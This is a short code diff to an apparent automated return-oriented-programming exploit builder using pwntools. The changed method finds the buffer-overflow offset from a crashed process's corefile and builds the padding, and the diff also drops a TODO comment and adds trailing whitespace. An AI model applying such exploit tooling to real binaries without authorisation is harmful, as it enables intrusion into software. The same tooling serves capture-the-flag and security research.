@@ -59,14 +59,14 @@ class ROP:
     def set_offset(self):
         self.fart_print.info("Attempting to find the offset to control the instruction pointer")
         try:
-            # TODO: Fix this. It failed 100% of the time
             p = process(self.filename)
             p.sendline(cyclic(1024, n=8))
             p.wait()
             core = p.corefile
             p.close()
             os.remove(core.file.name)
-            return b'A'*cyclic_find(core.read(core.rsp, 8), n=8)
+            offset = cyclic_find(core.read(core.rsp, 8), n=8)
+            return b'A'*offset
         except PwnlibException as e:
             self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
@@ -133,7 +133,7 @@ class ROP:
         p = process(self.filename)
         p.recvuntil(b": ")
         leak = p.recvline().decode('utf-8').strip()
-        p.close()
+        p.close() 
 
         return payload
 
